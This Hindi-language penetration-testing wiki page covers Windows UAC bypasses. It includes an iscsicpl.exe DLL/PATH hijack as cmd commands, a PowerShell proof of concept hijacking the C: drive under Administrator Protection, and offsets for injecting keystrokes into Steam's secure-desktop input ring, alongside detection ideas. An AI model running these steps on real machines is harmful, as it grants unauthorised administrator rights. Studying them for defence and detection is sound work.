यदि आप **UACME** देखें, तो आपको पता चलेगा कि **कई UAC bypass, DLL hijacking का दुरुपयोग करते हैं** (अक्सर किसी elevated binary से writable path में मौजूद attacker-controlled DLL load करवाकर)। [DLL hijacking vulnerability ढूँढने का तरीका जानने के लिए इसे पढ़ें](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. ऐसा binary ढूँढें जो **autoelevate** हो (जाँचें कि execute करने पर वह high integrity level में चलता है)।
2. Procmon से "**NAME NOT FOUND**" events ढूँढें, जो **DLL Hijacking** के लिए vulnerable हो सकते हैं।
3. संभवतः आपको DLL को कुछ **protected paths** (जैसे C:\Windows\System32) के अंदर **लिखना** होगा, जहाँ आपके पास write permissions नहीं हैं। आप इसे इस तरह bypass कर सकते हैं:
   1. **wusa.exe**: Windows 7,8 और 8.1। यह protected paths के अंदर CAB file का content extract कर सकता है (क्योंकि यह tool high integrity level से execute होता है)।
   2. **IFileOperation**: Windows 10।
4. अपनी DLL को protected path में copy करने और vulnerable तथा autoelevated binary को execute करने के लिए एक **script** तैयार करें।

### UAC bypass की एक और technique

इसमें यह देखना शामिल है कि कोई **autoElevated binary**, execute किए जाने वाले किसी **binary** या **command** का **नाम/path** **registry** से **read** करने की कोशिश करता है या नहीं (यह तब अधिक दिलचस्प है जब binary यह जानकारी **HKCU** के अंदर खोजता है)।

### `SysWOW64\iscsicpl.exe` और user `PATH` DLL hijack के ज़रिए UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe` एक **auto-elevated** binary है, जिसका search order के ज़रिए `iscsiexe.dll` load करने के लिए दुरुपयोग किया जा सकता है। यदि आप किसी malicious `iscsiexe.dll` को **user-writable** folder में रख सकते हैं और फिर current user `PATH` को modify कर सकते हैं (उदाहरण के लिए `HKCU\Environment\Path` के ज़रिए), ताकि उस folder में खोज हो, तो Windows attacker DLL को elevated `iscsicpl.exe` process के अंदर **UAC prompt दिखाए बिना** load कर सकता है।<sup>[[1]](#references)[[6]](#references)</sup>

व्यावहारिक बातें:
- यह तब उपयोगी है जब current user **Administrators** में हो, लेकिन UAC के कारण **Medium Integrity** पर चल रहा हो।
- इस bypass के लिए **SysWOW64** वाली copy प्रासंगिक है। **System32** वाली copy को अलग binary मानें और उसके behavior को स्वतंत्र रूप से validate करें।
- यह primitive **auto-elevation** और **DLL search-order hijacking** का संयोजन है, इसलिए अन्य UAC bypass के लिए उपयोग होने वाला वही ProcMon workflow, missing DLL load को validate करने के लिए उपयोगी है।

न्यूनतम flow:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Detection ideas:
- `reg add` / `HKCU\Environment\Path` में registry writes के तुरंत बाद `C:\Windows\SysWOW64\iscsicpl.exe` के execution पर alert करें।
- `%TEMP%` या `%LOCALAPPDATA%\Microsoft\WindowsApps` जैसी **user-controlled** locations में `iscsiexe.dll` खोजें।
- `iscsicpl.exe` launches को अप्रत्याशित child processes या सामान्य Windows directories के बाहर से DLL loads के साथ correlate करें।

### नया research जिसे अलग से देखना चाहिए

कुछ post-2024 chains अब classic `HKCU\Software\Classes` registry hijacks जैसी नहीं दिखतीं। उदाहरण के लिए, activation-context cache poisoning में **drive remap** और **DLL redirection** को chain करके trusted UI / auto-elevated binaries जैसे `ctfmon.exe` और बाद के targets जैसे `fodhelper.exe` के ज़रिए medium से high integrity तक पहुँचा जा सकता है। यहाँ बड़ा PoC दोहराने के बजाय, इनके compact payload examples देखें:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview): per-logon-session DOS device map के ज़रिए drive-letter hijack

> [!NOTE]
> अगस्त 2026 तक, Microsoft अब भी Administrator Protection को **Insider preview** के रूप में दस्तावेज़ित करता है: अक्टूबर 2025 का rollout वापस ले लिया गया था और इसे बाद की तारीख़ में जारी करने की योजना है। इन chains को test करने से पहले पुष्टि करें कि **Admin Approval Mode with Administrator protection** वास्तव में enabled है और device reboot किया जा चुका है; केवल stock 25H2 version string यह साबित नहीं करती कि feature सक्रिय है।<sup>[[10]](#references)</sup>

Windows 11 25H2 preview builds में `RAiLaunchAdminProcess` / UIAccess attack surface की पूरी जानकारी के लिए, dedicated page देखें:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 का “Administrator Protection” per-session `\Sessions\0\DosDevices/<LUID>` maps वाले shadow-admin tokens इस्तेमाल करता है। यह directory पहली `\??` resolution पर `SeGetTokenDeviceMap` द्वारा lazily बनाई जाती है। यदि attacker shadow-admin token को केवल **SecurityIdentification** पर impersonate करता है, तो directory attacker को **owner** बनाकर बनाई जाती है (`CREATOR OWNER` inherit करती है), जिससे ऐसे drive-letter links बनाए जा सकते हैं जिन्हें `\GLOBAL??` पर प्राथमिकता मिलती है।<sup>[[7]](#references)</sup>

**Steps:**

1. Low-privileged session से, promptless shadow-admin `runonce.exe` को spawn करने के लिए `RAiProcessRunOnce` call करें।
2. उसके primary token को **identification** token में duplicate करें और `\??` खोलते समय उसे impersonate करें, ताकि `\Sessions\0\DosDevices/<LUID>` attacker के ownership में बन जाए।
3. वहाँ एक `C:` symlink बनाएँ जो attacker-controlled storage की ओर point करे; उस session में बाद की filesystem accesses में `C:` attacker path पर resolve होगा, जिससे prompt के बिना DLL/file hijack संभव होगा।

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Preview hosts पर, Administrator Protection `Microsoft-Windows-LUA` provider के अंतर्गत approvals और failures को ETW events **15031** और **15032** के रूप में रिकॉर्ड करता है। इन events में requester SID, application path, outcome, managed administrator account और authentication method शामिल होते हैं, इसलिए बार-बार किए गए exploit attempts या असफल UI driving telemetry-free नहीं होते।<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### writable shared-memory ring के जरिए forwarded secure-desktop input

अगर medium-integrity user किसी secure-desktop helper के input IPC में लिख सकता है, तो वह UAC prompt को कमजोर कर सकता है। रिपोर्ट किए गए Steam design में, `IClientSecureDesktop::BStartStreaming`, `secure_desktop_capture.exe` को SYSTEM के रूप में `winsta0\winlogon` पर शुरू करता है। यह user को `GENERIC_ALL` access के साथ `Global\SecureDesktopInput_mem-IPCWrapper` उपलब्ध कराता है; helper ring entries को पढ़ता है और secure desktop पर `SendInput` कॉल करता है। यह UIAccess या `PromptOnSecureDesktop` बदलने से अलग है: input उस process द्वारा forwarded होता है जो पहले से वहां चल रहा है। देखें कि client इस handler तक कैसे पहुंचता है: [service IPC bootstrap](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc)। <sup>[[15]](#references)[[16]](#references)</sup>

Ring में 173 bytes के 128 slots हैं। इसके write और read counters `0x414` और `0x418` पर हैं, और slot `N`, `0x41c + 173*N` पर है। Slot का पहला byte plaintext के लिए `0` पर सेट करें, उसके तुरंत बाद 40-byte Windows `INPUT` कॉपी करें, फिर write counter आगे बढ़ाएं। Consent prompt देखने वाले medium-integrity administrator के लिए, elevation मांगने वाला executable शुरू करने के बाद keyboard पर `Y` key-down/key-up affirmative UAC control को activate कर सकता है; यह standard-user credential prompt का जवाब नहीं दे सकता। **Consent gate फिर भी मायने रखता है**: helper input तभी forward करता है, जब user ने मौजूदा 90-दिन की authorization अवधि के लिए उसके `InputEnabled` prompt को मंजूरी दी हो। केवल readable/writable mapping होना इस बात का प्रमाण नहीं है कि input prompt तक पहुंचता है; controlled test से पहले और बाद के read counter की तुलना करें। <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control कैसे काम करता है](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass techniques का संग्रह](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass compatibility scanner और launcher](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI ने PowerShell backdoors बनाने के लिए AI अपनाया](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: दक्षिण-पूर्व एशियाई सरकारी लक्ष्यों के विरुद्ध 0-Day exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection को bypass करना](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task का उपयोग करके UAC bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent, TabTip और Narrator Always Notify bypasses](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – .NET से Local Windows RPC Servers को कॉल करना](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte ने Signed Windows Kernel Rootkit के साथ CoolClient को बेहतर बनाया](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: जासूसी, चोरी और आतंक फैलाने के लिए बनाया गया Fully Undetectable Windows Trojan](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Valve को चालू करना](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – Turning the Valve PoCs](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
